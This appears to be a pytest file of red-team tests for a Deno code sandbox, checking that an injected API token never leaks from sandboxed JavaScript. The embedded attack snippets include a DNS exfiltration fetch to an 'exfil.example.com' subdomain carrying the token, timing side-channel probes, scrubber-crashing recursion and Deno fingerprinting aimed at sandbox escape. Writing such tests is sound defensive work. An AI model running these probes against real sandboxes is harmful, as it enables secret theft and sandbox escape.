"""New red team attack vectors - Feb 25, 2026 PM Audit by Cheenu."""

import asyncio
import json
from pathlib import Path

import pytest

from mistmind.sandbox import DenoSandbox


SECRET_TOKEN = "super-secret-api-token-12345"


@pytest.fixture
def deno_path():
    """Get path to Deno binary."""
    home = Path.home()
    deno_in_home = home / ".deno" / "bin" / "deno"
    
    if deno_in_home.exists():
        return str(deno_in_home)
    
    import shutil
    deno_in_path = shutil.which("deno")
    if deno_in_path:
        return deno_in_path
    
    pytest.skip("Deno not found")


@pytest.fixture
def sandbox(deno_path):
    """Create a Deno sandbox instance."""
    return DenoSandbox(deno_path=deno_path, timeout=5)


class TestFeb25PMCheenuAttacks:
    """Creative attack vectors from Feb 25, 2026 PM security audit by Cheenu."""
    
    @pytest.mark.asyncio
    async def test_attack_timing_side_channel_token_length(self, sandbox):
        """Attack: Use timing side-channel to infer token length via string comparison.
        
        By measuring how long it takes for certain operations to complete,
        we might be able to infer the token length or content character by character.
        This is a classic timing attack.
        """
        code = '''async () => {
            const timings = [];
            
            // Try to cause timing-dependent behavior that might leak token info
            for (let len = 1; len < 50; len++) {
                const start = performance.now();
                
                try {
                    // Make a request with various token-related operations
                    await mist.request({
                        method: "GET",
                        path: "/api/v1/self"
                    });
                } catch(e) {
                    // Expected for some lengths
                }
                
                const elapsed = performance.now() - start;
                timings.push({length: len, time: elapsed});
            }
            
            // Analyze timing variations
            const avgTime = timings.reduce((sum, t) => sum + t.time, 0) / timings.length;
            const outliers = timings.filter(t => Math.abs(t.time - avgTime) > avgTime * 0.5);
            
            return {
                avgTime,
                outliers: outliers.map(t => t.length),
                // Try to infer token length from timing pattern
                inferredLength: outliers[0]?.length || 0
            };
        }'''
        
        result = await sandbox.run_execute(code, SECRET_TOKEN, "api.mist.com")
        result_str = json.dumps(result)
        
        # Token should never leak through timing analysis
        assert SECRET_TOKEN not in result_str
        
        # Even if timing differences exist, they shouldn't reveal token
        # This test documents that timing channels exist but don't leak the actual token
        assert "inferredLength" in result or "error" in result
    
    @pytest.mark.asyncio
    async def test_attack_dns_exfiltration_via_fetch_subdomain(self, sandbox):
        """Attack: Try to exfiltrate token via DNS by embedding it in a subdomain.
        
        Even though network is restricted, if we can control any part of a DNS query
        (e.g., via fetch to a crafted subdomain), we might exfiltrate data through DNS logs.
        """
        code = '''async () => {
            try {
                // Try to access mist object properties and embed in URL
                const mistInfo = {
                    allowedMethods: mist.allowedMethods,
                    hasRequest: typeof mist.request === 'function'
                };
                
                // Try to make a DNS query with token embedded in subdomain
                // This should be blocked by --allow-net restrictions
                await fetch(`https://${SECRET_TOKEN}.exfil.example.com/leak`);
                
                return {leaked: "DNS query succeeded!"};
            } catch(e) {
                // Expected to fail due to network restrictions
                return {
                    error: e.message,
                    blocked: true,
                    // Even in error, don't leak
                    mistInfo: "checked"
                };
            }
        }'''
        
        result = await sandbox.run_execute(code, SECRET_TOKEN, "api.mist.com")
        result_str = json.dumps(result)
        
        # Token should be scrubbed from error messages
        assert SECRET_TOKEN not in result_str
        
        # Fetch should be blocked by network allowlist
        assert "error" in result
        assert result.get("blocked") is True or "PermissionDenied" in result.get("error", "")
    
    @pytest.mark.asyncio
    async def test_attack_recursive_object_crash_scrubber(self, sandbox):
        """Attack: Create deeply recursive object to crash token scrubbing logic.
        
        The _scrub_dict function recursively processes dicts/lists. If we create
        a deeply nested or circular structure, we might trigger a stack overflow
        that bypasses the scrubbing logic, leaking the token in an error trace.
        """
        code = '''async () => {
            try {
                // Create a deeply nested structure
                let obj = {token: "looking for secrets"};
                let current = obj;
                
                for (let i = 0; i < 10000; i++) {
                    current.nested = {
                        level: i,
                        data: "A".repeat(100)
                    };
                    current = current.nested;
                }
                
                // Try to return this huge structure
                return obj;
            } catch(e) {
                // If it crashes, the error might contain token
                return {
                    error: e.message,
                    stack: e.stack,
                    // Try to trigger scrubbing of huge strings
                    huge: "B".repeat(100000)
                };
            }
        }'''
        
        result = await sandbox.run_execute(code, SECRET_TOKEN, "api.mist.com")
        result_str = json.dumps(result)
        
        # Token should never leak even if scrubbing fails
        assert SECRET_TOKEN not in result_str
        
        # Should either succeed with size limit error or handle gracefully
        assert "error" in result or "nested" in result


class TestRacyAsyncAttacks:
    """Test race conditions in async operations."""
    
    @pytest.mark.asyncio
    async def test_attack_parallel_mist_requests_race(self, sandbox):
        """Attack: Race multiple mist.request() calls to trigger concurrent scrubbing errors.
        
        If the scrubbing logic isn't thread-safe or has race conditions,
        parallel requests might cause token leakage.
        """
        code = '''async () => {
            // Fire multiple requests in parallel
            const promises = [];
            
            for (let i = 0; i < 50; i++) {
                promises.push(
                    mist.request({
                        method: "GET",
                        path: "/api/v1/self"
                    }).catch(e => ({error: e.message, attempt: i}))
                );
            }
            
            // Wait for all to complete
            const results = await Promise.all(promises);
            
            return {
                total: results.length,
                errors: results.filter(r => r.error).length,
                successes: results.filter(r => !r.error).length,
                sample: results[0]
            };
        }'''
        
        result = await sandbox.run_execute(code, SECRET_TOKEN, "api.mist.com")
        result_str = json.dumps(result)
        
        # Token should be scrubbed from all parallel results
        assert SECRET_TOKEN not in result_str
        
        # Should handle parallel requests gracefully
        assert "total" in result or "error" in result
    
    @pytest.mark.asyncio
    async def test_attack_error_in_scrubbing_path(self, sandbox):
        """Attack: Trigger an error in the scrubbing code path itself.
        
        If we can cause the scrubbing function to crash, the original error
        with the token might leak through.
        """
        code = '''async () => {
            try {
                // Create objects with unusual properties that might break scrubbing
                const weirdObj = {
                    [Symbol.toStringTag]: "MistToken",
                    toString() {
                        throw new Error("toString crashed");
                    },
                    valueOf() {
                        return SECRET_TOKEN;  // Try to reference non-existent variable
                    },
                    toJSON() {
                        throw new Error("JSON serialization failed");
                    }
                };
                
                // Try to make a request that returns this weird object
                await mist.request({
                    method: "GET",
                    path: "/api/v1/self"
                });
                
                return weirdObj;
            } catch(e) {
                return {
                    error: e.message,
                    stack: e.stack,
                    // Include weird objects in error response
                    context: {
                        [Symbol.for("token")]: "leaked?",
                        nested: {
                            toString: () => SECRET_TOKEN  // Reference undefined
                        }
                    }
                };
            }
        }'''
        
        result = await sandbox.run_execute(code, SECRET_TOKEN, "api.mist.com")
        result_str = json.dumps(result)
        
        # Token should be scrubbed even if weird objects are involved
        assert SECRET_TOKEN not in result_str
        
        # Should handle unusual objects gracefully
        assert "error" in result or "context" in result


class TestDenoBinaryExploit:
    """Test attempts to exploit Deno binary itself."""
    
    @pytest.mark.asyncio
    async def test_attack_deno_version_fingerprint(self, sandbox):
        """Attack: Fingerprint Deno version to find known vulnerabilities.
        
        If we can determine the exact Deno version, we might find known CVEs
        to exploit for sandbox escape.
        """
        code = '''async () => {
            try {
                // Try to access Deno version info
                const version = Deno.version;
                
                // Try to check for known vulnerable functions
                const dangerousFunctions = [
                    typeof Deno.run,
                    typeof Deno.openPlugin,
                    typeof Deno.spawn,
                    typeof Deno.Command,
                    typeof Deno.readFileSync,
                    typeof Deno.writeFileSync,
                    typeof Deno.env.get,
                ];
                
                return {
                    version,
                    dangerousFunctions,
                    // Try to access internal Deno symbols
                    internal: Object.getOwnPropertySymbols(Deno).map(s => s.toString())
                };
            } catch(e) {
                return {error: e.message};
            }
        }'''
        
        result = await sandbox.run_execute(code, SECRET_TOKEN, "api.mist.com")
        result_str = json.dumps(result)
        
        # Token should never leak
        assert SECRET_TOKEN not in result_str
        
        # Dangerous functions should be undefined due to permissions
        if "dangerousFunctions" in result:
            dangerous = result["dangerousFunctions"]
            # Most should be 'undefined' or missing due to --deny-* permissions
            assert dangerous.count("function") < len(dangerous)
